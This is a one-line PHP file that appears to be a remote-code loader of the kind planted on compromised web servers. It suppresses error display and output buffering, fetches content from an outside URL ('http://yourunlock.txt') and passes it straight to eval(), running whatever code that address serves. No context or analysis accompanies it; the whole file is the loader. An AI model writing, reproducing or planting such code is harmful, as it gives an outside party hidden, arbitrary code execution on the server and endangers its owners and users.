<?php @ini_set('output_buffering',0); @ini_set('display_errors', 0); $encdyc = file_get_contents("http://yourunlock.txt"); eval("?>".($encdyc)); ?>
